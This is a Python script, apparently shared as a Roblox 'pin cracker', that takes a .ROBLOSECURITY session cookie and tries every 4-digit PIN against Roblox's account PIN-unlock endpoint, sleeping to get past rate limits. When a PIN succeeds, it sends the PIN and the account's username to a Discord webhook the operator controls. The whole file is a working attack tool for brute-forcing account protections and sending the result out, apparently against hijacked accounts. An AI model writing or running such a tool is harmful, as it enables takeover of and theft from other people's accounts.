#THE SOURCE CODE IS NOT MINE - NO COPYRIGHT INFRINGEMENT INTENDED : CTTRO
import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('================================================\n PIN | REMODDED BY: RAISHIN \n================================================')
print('')
print('Enter your cookie below:')
cookie = input()
os.system("clear")
print('')
print('Enter your webhook below:')
webhook = input()
os.system("clear")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("clear")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = 'Pin Successfully Cracked!'
os.system("clear")

print('''Cracker Has Started.''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Rai$hin - Pin Cracker",
                "avatar_url" : "https://cdn.discordapp.com/attachments/1234384385310986241/1302569512192839680/Kokichi_Muta.png?ex=6729e964&is=672897e4&hm=decf67d5cf366b2098e60d6066533e24f54b5eb4cdc6bbe572460f04ac2e6a46&"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : FF3AE599,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
